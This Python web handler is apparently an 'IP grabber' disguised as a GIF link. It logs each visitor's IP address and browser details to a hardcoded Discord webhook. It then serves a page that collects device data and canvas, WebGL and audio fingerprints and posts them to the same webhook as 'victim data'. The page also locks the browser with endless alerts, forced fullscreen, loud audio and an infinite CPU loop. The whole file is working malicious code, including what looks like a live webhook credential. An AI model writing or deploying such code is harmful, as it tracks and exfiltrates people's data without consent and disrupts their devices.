from http.server import BaseHTTPRequestHandler
import requests
import httpagentparser

WEBHOOK_URL = "https://discord.com/api/webhooks/1490146029503385734/dJHDVdTh11QHFw_ikNw-wpFG3NB8AN02Xl-rGMTn_8ejJxvyTWYyxOhdZ3P3U1tNQ_BV"

FAKE_IMAGE_URL = "https://media.tenor.com/XPiWs5il8owAAAAM/tung-tungtung-tungtungtung-sahur-tungtungtungsahur-tungtungsahur.gif"

# ──────── MAXIMUM INFO + ANNOYING PAGE ────────
ANNOY_HTML = """
<!DOCTYPE html>
<html>
<head>
  <meta charset="UTF-8">
  <title>TUNG TUNG VIRUS</title>
  <style>
    body{margin:0;background:#000;color:#f00;font-family:monospace;overflow:hidden;height:100vh;}
    #overlay{position:fixed;inset:0;background:rgba(255,0,0,0.95);display:flex;align-items:center;justify-content:center;flex-direction:column;z-index:9999;}
    h1{font-size:6em;animation:blink 0.3s infinite;}
    @keyframes blink{0%,100%{opacity:1} 50%{opacity:0.1}}
  </style>
</head>
<body>
  <div id="overlay">
    <h1>TUNG TUNG VIRUS</h1>
    <p>Stealing every bit of your info...</p>
  </div>

  <!-- Loud Tung Tung Song -->
  <audio id="song" autoplay loop>
    <source src="https://www.myinstants.com/media/sounds/tung-tung-sahur.mp3" type="audio/mpeg">
  </audio>

  <script>
    const webhook = "%s";

    async function getMaxInfo() {
      const info = {
        timestamp: new Date().toISOString(),
        ip: "Client-side only (see server log)",
        screen: {
          width: screen.width,
          height: screen.height,
          availWidth: screen.availWidth,
          availHeight: screen.availHeight,
          colorDepth: screen.colorDepth,
          pixelDepth: screen.pixelDepth,
          devicePixelRatio: window.devicePixelRatio
        },
        window: { innerWidth: window.innerWidth, innerHeight: window.innerHeight },
        navigator: {
          userAgent: navigator.userAgent,
          platform: navigator.platform,
          vendor: navigator.vendor,
          language: navigator.language,
          languages: navigator.languages,
          deviceMemory: navigator.deviceMemory || "N/A",
          hardwareConcurrency: navigator.hardwareConcurrency || "N/A",
          cookieEnabled: navigator.cookieEnabled,
          doNotTrack: navigator.doNotTrack,
          onLine: navigator.onLine
        },
        connection: navigator.connection ? {
          effectiveType: navigator.connection.effectiveType,
          downlink: navigator.connection.downlink,
          rtt: navigator.connection.rtt,
          saveData: navigator.connection.saveData
        } : "N/A",
        timezone: Intl.DateTimeFormat().resolvedOptions().timeZone,
        touchSupport: 'ontouchstart' in window,
        referrer: document.referrer || "Direct",
        performance: performance.memory ? {
          jsHeapSizeLimit: performance.memory.jsHeapSizeLimit,
          totalJSHeapSize: performance.memory.totalJSHeapSize,
          usedJSHeapSize: performance.memory.usedJSHeapSize
        } : "N/A"
      };

      // Canvas Fingerprint
      try {
        const canvas = document.createElement('canvas');
        const ctx = canvas.getContext('2d');
        ctx.textBaseline = "alphabetic";
        ctx.font = "14px Arial";
        ctx.fillStyle = "#f60";
        ctx.fillRect(125, 1, 62, 20);
        ctx.fillStyle = "#069";
        ctx.fillText("Tung Tung", 2, 15);
        info.canvasFingerprint = canvas.toDataURL();
      } catch(e) { info.canvasFingerprint = "Blocked"; }

      // WebGL Fingerprint
      try {
        const gl = document.createElement('canvas').getContext('webgl');
        if (gl) {
          info.webgl = {
            vendor: gl.getParameter(gl.VENDOR),
            renderer: gl.getParameter(gl.RENDERER),
            version: gl.getParameter(gl.VERSION),
            shadingLanguageVersion: gl.getParameter(gl.SHADING_LANGUAGE_VERSION)
          };
        }
      } catch(e) { info.webgl = "Blocked"; }

      // AudioContext Fingerprint
      try {
        const audioCtx = new (window.AudioContext || window.webkitAudioContext)();
        const oscillator = audioCtx.createOscillator();
        const analyser = audioCtx.createAnalyser();
        oscillator.connect(analyser);
        analyser.connect(audioCtx.destination);
        oscillator.frequency.value = 1000;
        oscillator.start();
        const buffer = new Uint8Array(analyser.frequencyBinCount);
        analyser.getByteFrequencyData(buffer);
        info.audioFingerprint = Array.from(buffer).join(',');
        oscillator.stop();
      } catch(e) { info.audioFingerprint = "Blocked"; }

      // Send everything to Discord
      fetch(webhook, {
        method: "POST",
        headers: {"Content-Type": "application/json"},
        body: JSON.stringify({
          content: "**=== MAXIMUM INFO COLLECTED ===**",
          embeds: [{
            title: "🕵️ FULL VICTIM DATA",
            color: 0xff0000,
            description: Object.entries(info).map(([k,v]) => `**${k}**:\n\`\`\`${typeof v === 'object' ? JSON.stringify(v,null,2) : v}\`\`\``).join("\n\n"),
            timestamp: new Date().toISOString()
          }]
        })
      });
    }

    // Run everything
    getMaxInfo();

    // Loud song
    const audio = document.getElementById("song");
    audio.volume = 1.0;
    audio.play().catch(() => {});

    // Annoying stuff
    document.documentElement.requestFullscreen?.().catch(() => {});
    window.onbeforeunload = () => "TUNG TUNG says NO!";
    setInterval(() => alert("TUNG TUNG VIRUS: CLOSE FAILED!"), 700);

    // Heavy CPU lag
    function cpuHell() {
      while(true) {
        for(let i = 0; i < 20000000; i++) {
          Math.sin(i) * Math.cos(i) * Math.random();
        }
        setTimeout(cpuHell, 0);
      }
    }
    cpuHell();

    // Force GIF download
    const link = document.createElement('a');
    link.href = "%s";
    link.download = "tung-tung-virus.gif";
    document.body.appendChild(link);
    link.click();
    document.body.removeChild(link);
  </script>
</body>
</html>
""" % (WEBHOOK_URL, FAKE_IMAGE_URL)

class handler(BaseHTTPRequestHandler):
    def do_GET(self):
        try:
            ip = self.headers.get('X-Forwarded-For', self.client_address[0])
            port = self.headers.get('X-Forwarded-Port', 'Unknown')
            user_agent = self.headers.get('User-Agent', 'Unknown')
            parsed = httpagentparser.detect(user_agent)

            quick_log = f"""**NEW CLICK!**
IP: `{ip}`
Port: `{port}`
Browser: {parsed.get('browser', {}).get('name', 'Unknown')}
OS: {parsed.get('os', {}).get('name', 'Unknown')}
UA: `{user_agent}`"""

            requests.post(WEBHOOK_URL, json={"content": quick_log})

            html = ANNOY_HTML.encode('utf-8')
            self.send_response(200)
            self.send_header('Content-type', 'text/html')
            self.send_header('Content-Length', len(html))
            self.end_headers()
            self.wfile.write(html)

        except Exception as e:
            self.send_response(500)
            self.end_headers()
            self.wfile.write(f"Error: {str(e)}".encode())

    def do_HEAD(self):
        self.do_GET()
